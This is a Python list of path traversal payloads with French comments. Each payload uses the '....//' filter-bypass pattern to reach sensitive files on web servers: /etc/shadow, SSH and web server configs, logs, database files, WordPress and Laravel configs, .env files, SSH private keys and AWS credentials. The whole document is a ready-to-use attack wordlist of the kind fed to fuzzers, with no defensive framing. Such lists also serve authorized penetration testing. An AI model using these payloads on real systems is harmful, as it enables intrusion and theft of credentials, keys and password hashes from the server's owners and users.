traversals_double_classic = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "....//....//....//....//....//....//etc/shadow",                   # Hashs mots de passe (root requis)
    "....//....//....//....//....//....//etc/group",                    # Groupes
    "....//....//....//....//....//....//etc/hostname",                 # Nom de la machine
    "....//....//....//....//....//....//etc/hosts",                    # Résolution locale
    "....//....//....//....//....//....//etc/resolv.conf",              # DNS
    "....//....//....//....//....//....//etc/os-release",               # Infos OS
    "....//....//....//....//....//....//etc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "....//....//....//....//....//....//etc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "....//....//....//....//....//....//etc/sysctl.conf",              # Paramètres kernel
    "....//....//....//....//....//....//etc/services",                 # Liste des ports/services
    "....//....//....//....//....//....//etc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
    "....//....//....//....//....//....//var/log/syslog",               # Debian/Ubuntu
    "....//....//....//....//....//....//var/log/messages",             # RedHat/CentOS
    "....//....//....//....//....//....//var/log/auth.log",             # Authentification
    "....//....//....//....//....//....//var/log/secure",               # Sécurité (RedHat)
    "....//....//....//....//....//....//var/log/dmesg",                # Logs kernel
    "....//....//....//....//....//....//var/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "....//....//....//....//....//....//var/log/httpd/error_log",      # Logs Apache RedHat
    "....//....//....//....//....//....//var/log/nginx/error.log",      # Logs Nginx
    "....//....//....//....//....//....//var/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "....//....//....//....//....//....//var/www/html/index.html",      # Page par défaut
    "....//....//....//....//....//....//var/www/html/index.php",       # Page PHP
    "....//....//....//....//....//....//var/www/html/config.php",      # Config PHP
    "....//....//....//....//....//....//etc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "....//....//....//....//....//....//etc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "....//....//....//....//....//....//etc/nginx/nginx.conf",         # Config Nginx
    "....//....//....//....//....//....//etc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "....//....//....//....//....//....//etc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "....//....//....//....//....//....//etc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "....//....//....//....//....//....//var/lib/mysql/mysql/user.MYD",       # MySQL users
    "....//....//....//....//....//....//var/lib/mysql/mysql/user.frm",       # MySQL users structure
    "....//....//....//....//....//....//var/lib/mysql/mysql.db",             # DB principales
    "....//....//....//....//....//....//var/lib/mysql/mysql/user.ibd",       # Table user
    "....//....//....//....//....//....//var/lib/mysql/ibdata1",              # Données globales MySQL
    "....//....//....//....//....//....//var/lib/mysql/ib_logfile0",          # Logs InnoDB
    "....//....//....//....//....//....//var/lib/mysql/ib_logfile1",          # Logs InnoDB
    "....//....//....//....//....//....//etc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "....//....//....//....//....//....//etc/my.cnf",                         # Config MySQL générique
    "....//....//....//....//....//....//var/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "....//....//....//....//....//....//var/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "....//....//....//....//....//....//var/lib/postgresql/data/base",       # Bases PostgreSQL
    "....//....//....//....//....//....//data/data/com.mysql/databases.db",   # MySQL sur Android
    "....//....//....//....//....//....//var/www/html/db.sqlite3",            # SQLite Django
    "....//....//....//....//....//....//var/www/html/database.sqlite",       # SQLite générique
    "....//....//....//....//....//....//var/www/html/storage/database.sqlite", # Laravel SQLite
    "....//....//....//....//....//....//var/www/html/db.sql",
    "....//....//....//....//....//....//var/www/html/backup.sql",
    "....//....//....//....//....//....//var/lib/mongodb/mongod.lock",
    "....//....//....//....//....//....//var/lib/redis/dump.rdb",
    "....//....//....//....//....//....//var/www/html/sql_dump.sql",
    "....//....//....//....//....//....//var/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "....//....//....//....//....//....//var/www/html/wp-config.php",         # Config WordPress
    "....//....//....//....//....//....//var/www/html/wp-content/uploads",    # Uploads WP
    "....//....//....//....//....//....//var/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "....//....//....//....//....//....//var/www/html/sites/default/settings.php",

    # Joomla
    "....//....//....//....//....//....//var/www/html/configuration.php",

    # Magento
    "....//....//....//....//....//....//var/www/html/app/etc/env.php",

    # Laravel
    "....//....//....//....//....//....//var/www/html/.env",                  # Config Laravel
    "....//....//....//....//....//....//var/www/html/storage/logs/laravel.log",

    # Django
    "....//....//....//....//....//....//var/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "....//....//....//....//....//....//.env",                               # Fichier d'env générique
    "....//....//....//....//....//....//config.json",                        # Config JSON générique
    "....//....//....//....//....//....//config.php",                         # Config PHP générique
    "....//....//....//....//....//....//settings.py",                        # Config Django
    "....//....//....//....//....//....//database.yml",                       # Rails config DB
    "....//....//....//....//....//....//composer.json",                      # PHP dépendances
    "....//....//....//....//....//....//package.json",                       # NodeJS dépendances
    "....//....//....//....//....//....//.git/config",                        # Config Git
    "....//....//....//....//....//....//.htaccess",                          # Fichier Apache
    "....//....//....//....//....//....//.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "....//....//....//....//....//....//etc/crontab",
    "....//....//....//....//....//....//var/spool/cron/root",
    "....//....//....//....//....//....//var/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "....//.htaccess", "....//....//.htaccess",
    "....//.htpasswd", "....//....//.htpasswd",
    "....//.user.ini", "....//....//.user.ini",
    "....//web.config", "....//....//web.config",
    
    # Fichiers config
    "....//.env", "....//....//.env",
    "....//config.php", "....//....//config.php",
    "....//settings.php", "....//....//settings.php",
    "....//wp-config.php", "....//....//wp-config.php",
    "....//configuration.php", "....//....//configuration.php",
    "....//env.php", "....//....//env.php",

    # Logs
    "....//error.log", "....//....//error.log",
    "....//debug.log", "....//....//debug.log",
    "....//laravel.log", "....//....//laravel.log",

    # Backups
    "....//backup.zip", "....//....//backup.zip",
    "....//config.php.bak", "....//....//config.php.bak",
    "....//wp-config.php.old", "....//....//wp-config.php.old",

    # Credentials
    "....//.git/config", "....//....//.git/config",
    "....//.ssh/id_rsa", "....//....//.ssh/id_rsa",
    "....//.aws/credentials", "....//....//.aws/credentials",

    # CMS
    "....//wp-content/debug.log", "....//....//wp-content/debug.log",
    "....//sites/default/settings.php", "....//....//sites/default/settings.php",
    "....//storage/logs/laravel.log", "....//....//storage/logs/laravel.log",

    # Temp
    "....//debug.php", "....//....//debug.php"
    
]
